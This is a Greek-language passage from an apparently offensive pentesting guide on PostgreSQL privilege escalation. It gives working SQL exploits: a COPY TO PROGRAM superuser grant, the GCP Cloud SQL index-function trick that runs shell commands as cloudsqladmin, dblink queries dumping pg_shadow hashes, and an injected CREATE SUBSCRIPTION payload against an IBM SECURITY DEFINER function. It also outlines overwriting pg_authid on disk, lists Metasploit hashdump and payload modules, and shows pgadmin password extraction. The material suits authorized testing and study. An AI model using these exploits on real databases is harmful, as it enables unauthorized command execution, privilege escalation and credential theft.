Συχνά συμβαίνει να βρείτε ότι **οι τοπικοί χρήστες μπορούν να συνδεθούν στο PostgreSQL χωρίς να παρέχουν κωδικό πρόσβασης**. Έτσι, αφού έχετε συγκεντρώσει **δικαιώματα για εκτέλεση κώδικα**, μπορείτε να εκμεταλλευτείτε αυτά τα δικαιώματα για να αποκτήσετε τον ρόλο **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
Αυτό είναι συνήθως δυνατό λόγω των παρακάτω γραμμών στο αρχείο **`pg_hba.conf`**:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
### **ΑΛΛΑΓΗ ΠΙΝΑΚΑ privesc**

Στο [**συγκεκριμένο άρθρο**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) εξηγείται πώς ήταν δυνατή η **privesc** στο Postgres GCP καταχρώντας το προνόμιο ALTER TABLE που είχε δοθεί στον χρήστη.

Όταν προσπαθείτε να **κάνετε άλλο χρήστη ιδιοκτήτη ενός πίνακα**, θα πρέπει να λάβετε ένα **σφάλμα** που το αποτρέπει, αλλά φαίνεται ότι το GCP έδινε αυτήν την **επιλογή στον μη-υπερχρήστη postgres user** στο GCP:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Συνδυάζοντας αυτήν την ιδέα με το γεγονός ότι όταν τα **INSERT/UPDATE/ANALYZE** εκτελούνται σε έναν πίνακα με μια συνάρτηση δείκτη, η **συνάρτηση** καλείται ως μέρος της εντολής με τα **δικαιώματα ιδιοκτήτη του πίνακα**. Είναι δυνατόν να δημιουργηθεί ένας δείκτης με μια συνάρτηση και να δοθούν δικαιώματα ιδιοκτήτη σε έναν **υπερχρήστη** για αυτόν τον πίνακα, και στη συνέχεια να εκτελεστεί το ANALYZE στον πίνακα με την κακόβουλη συνάρτηση που θα μπορεί να εκτελέσει εντολές επειδή χρησιμοποιεί τα δικαιώματα του ιδιοκτήτη.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Εκμετάλλευση

1. Ξεκινήστε δημιουργώντας έναν νέο πίνακα.
2. Εισάγετε μερικό ασήμαντο περιεχόμενο στον πίνακα για να παρέχετε δεδομένα για τη λειτουργία του δείκτη.
3. Αναπτύξτε μια κακόβουλη λειτουργία δείκτη που περιέχει ένα φορτίο εκτέλεσης κώδικα, επιτρέποντας την εκτέλεση μη εξουσιοδοτημένων εντολών.
4. Αλλάξτε τον ιδιοκτήτη του πίνακα σε "cloudsqladmin," που είναι ο ρόλος υπερχρήστη του GCP που χρησιμοποιείται αποκλειστικά από το Cloud SQL για τη διαχείριση και συντήρηση της βάσης δεδομένων.
5. Εκτελέστε μια λειτουργία ANALYZE στον πίνακα. Αυτή η ενέργεια υποχρεώνει τη μηχανή PostgreSQL να μεταβεί στο πλαίσιο χρήστη του ιδιοκτήτη του πίνακα, "cloudsqladmin." Ως εκ τούτου, η κακόβουλη λειτουργία δείκτη καλείται με τα δικαιώματα του "cloudsqladmin," επιτρέποντας έτσι την εκτέλεση της προηγουμένως μη εξουσιοδοτημένης εντολής κέλυφους.

Στη PostgreSQL, αυτή η ροή φαίνεται κάπως έτσι:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Τότε, ο πίνακας `shell_commands_results` θα περιέχει το αποτέλεσμα του εκτελεσμένου κώδικα:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Τοπική Σύνδεση

Κάποιες λανθασμένα διαμορφωμένες περιπτώσεις του postgresql μπορεί να επιτρέπουν τη σύνδεση οποιουδήποτε τοπικού χρήστη, είναι δυνατή η τοπική σύνδεση από τη διεύθυνση 127.0.0.1 χρησιμοποιώντας τη **συνάρτηση `dblink`**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
Σημειώστε ότι για το προηγούμενο ερώτημα να λειτουργήσει **η λειτουργία `dblink` πρέπει να υπάρχει**. Αν δεν υπάρχει, μπορείτε να προσπαθήσετε να τη δημιουργήσετε με την εντολή:
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

Αν έχετε τον κωδικό πρόσβασης ενός χρήστη με περισσότερα προνόμια, αλλά ο χρήστης δεν επιτρέπεται να συνδεθεί από εξωτερική διεύθυνση IP, μπορείτε να χρησιμοποιήσετε την παρακάτω συνάρτηση για να εκτελέσετε ερωτήματα ως αυτός ο χρήστης:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Είναι δυνατόν να ελέγξετε αν αυτή η λειτουργία υπάρχει με:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Προσαρμοσμένη ορισμένη συνάρτηση με** SECURITY DEFINER

[**Σε αυτήν την ανάλυση**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), οι ελεγκτές ασφαλείας κατάφεραν να ανέβουν στην ιεραρχία μέσα σε ένα περιβάλλον postgres που παρέχεται από την IBM, επειδή **εντόπισαν αυτήν τη συνάρτηση με τη σημαία SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

Όπως [**εξηγείται στα έγγραφα**](https://www.postgresql.org/docs/current/sql-createfunction.html) μια συνάρτηση με **SECURITY DEFINER εκτελείται** με τα προνόμια του **χρήστη που την κατέχει**. Επομένως, αν η συνάρτηση είναι **ευάλωτη σε Ενσωμάτωση SQL** ή εκτελεί κάποιες **προνομιούχες ενέργειες με παραμέτρους που ελέγχονται από τον εισβολέα**, θα μπορούσε να καταχραστεί για να **ανέβει στην ιεραρχία εντός του postgres**.

Στη γραμμή 4 του προηγούμενου κώδικα μπορείτε να δείτε ότι η συνάρτηση έχει τη **σημαία SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
Και στη συνέχεια **εκτελέστε εντολές**:

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### Διέλευση με Bruteforce με το PL/pgSQL

Το **PL/pgSQL** είναι μια **πλήρως λειτουργική γλώσσα προγραμματισμού** που προσφέρει μεγαλύτερο διαδικαστικό έλεγχο σε σύγκριση με την SQL. Επιτρέπει τη χρήση **βρόχων** και άλλων **δομών ελέγχου** για τη βελτίωση της λογικής του προγράμματος. Επιπλέον, **οι δηλώσεις SQL** και **οι ενεργοποιητές (triggers)** έχουν τη δυνατότητα να καλούν συναρτήσεις που δημιουργούνται χρησιμοποιώντας τη **γλώσσα PL/pgSQL**. Αυτή η ολοκλήρωση επιτρέπει μια πιο περιεκτική και ευέλικτη προσέγγιση στον προγραμματισμό και την αυτοματοποίηση της βάσης δεδομένων.\
**Μπορείτε να καταχραστείτε αυτήν τη γλώσσα για να ζητήσετε από το PostgreSQL να δοκιμάσει βίαια τα διαπιστευτήρια των χρηστών.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

### Ανύψωση δικαιωμάτων με τον Αντικατάσταση Εσωτερικών Πινάκων του PostgreSQL

{% hint style="info" %}
Το παρακάτω διάνυσμα ανύψωσης δικαιωμάτων είναι ιδιαίτερα χρήσιμο σε περιορισμένα πλαίσια SQLi, καθώς όλα τα βήματα μπορούν να πραγματοποιηθούν μέσω εμφωλευμένων δηλώσεων SELECT
{% endhint %}

Αν μπορείτε να **διαβάσετε και να γράψετε αρχεία εξυπηρετητή PostgreSQL**, μπορείτε να **γίνετε υπερχρήστης** με τον αντικαταστάτη του PostgreSQL στο δίσκο, που σχετίζεται με τον εσωτερικό πίνακα `pg_authid`.

Διαβάστε περισσότερα για **αυτήν την τεχνική** [**εδώ**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

Τα βήματα της επίθεσης είναι:

1. Αποκτήστε τον κατάλογο δεδομένων του PostgreSQL
2. Αποκτήστε ένα σχετικό μονοπάτι προς τον κόμβο αρχείου, που σχετίζεται με τον πίνακα `pg_authid`
3. Λήψη του κόμβου αρχείου μέσω των λειτουργιών `lo_*`
4. Λήψη του τύπου δεδομένων, που σχετίζεται με τον πίνακα `pg_authid`
5. Χρησιμοποιήστε το [Επεξεργαστή Κόμβου Αρχείου του PostgreSQL](https://github.com/adeadfed/postgresql-filenode-editor) για να [επεξεργαστείτε τον κόμβο αρχείου](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg\_authid-table); ορίστε όλες τις λογικές σημαίες `rol*` σε 1 για πλήρη δικαιώματα.
6. Επαναφορτώστε τον επεξεργασμένο κόμβο αρχείου μέσω των λειτουργιών `lo_*`, και αντικαταστήστε το αρχικό αρχείο στο δίσκο
7. _(Προαιρετικά)_ Καθαρίστε τη μνήμη cache του πίνακα εκτελώντας μια δαπανηρή δήλωση SQL
8. Πρέπει τώρα να έχετε τα προνόμια ενός πλήρους υπερδιαχειριστή.
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### καταγραφή

Μέσα στο αρχείο _**postgresql.conf**_ μπορείτε να ενεργοποιήσετε τα logs του postgresql αλλάζοντας:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Στη συνέχεια, **επανεκκινήστε την υπηρεσία**.

### pgadmin

Το [pgadmin](https://www.pgadmin.org) είναι μια πλατφόρμα διαχείρισης και ανάπτυξης για το PostgreSQL.\
Μπορείτε να βρείτε **κωδικούς πρόσβασης** μέσα στο αρχείο _**pgadmin4.db**_\
Μπορείτε να τους αποκρυπτογραφήσετε χρησιμοποιώντας τη λειτουργία _**decrypt**_ μέσα στο σενάριο: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

Η πιστοποίηση πελάτη στο PostgreSQL διαχειρίζεται μέσω ενός αρχείου ρυθμίσεων που ονομάζεται **pg\_hba.conf**. Αυτό το αρχείο περιέχει μια σειρά εγγραφών, καθεμία από τις οποίες καθορίζει έναν τύπο σύνδεσης, εύρος διευθύνσεων IP πελάτη (εάν είναι εφαρμόσιμο), όνομα βάσης δεδομένων, όνομα χρήστη και τη μέθοδο πιστοποίησης που θα χρησιμοποιηθεί για την αντιστοίχιση των συνδέσεων. Η πρώτη εγγραφή που ταιριάζει με τον τύπο σύνδεσης, τη διεύθυνση του πελάτη, τη ζητούμενη βάση δεδομένων και το όνομα χρήστη χρησιμοποιείται για την πιστοποίηση. Δεν υπάρχει εναλλακτική λύση ή αντίγραφο ασφαλείας εάν αποτύχει η πιστοποίηση. Εάν καμία εγγραφή δεν ταιριάζει, η πρόσβαση αρνείται.

Οι διαθέσιμες μέθοδοι πιστοποίησης βασισμένες σε κωδικό στο αρχείο pg\_hba.conf είναι **md5**, **crypt** και **password**. Αυτές οι μέθοδοι διαφέρουν στον τρόπο μετάδοσης του κωδικού πρόσβασης: με κρυπτογράφηση MD5, κρυπτογράφηση με crypt ή κείμενο καθαρό. Σημαντικό είναι να σημειωθεί ότι η μέθοδος crypt δεν μπορεί να χρησιμοποιηθεί με κωδικούς πρόσβασης που έχουν κρυπτογραφηθεί στο pg\_authid.
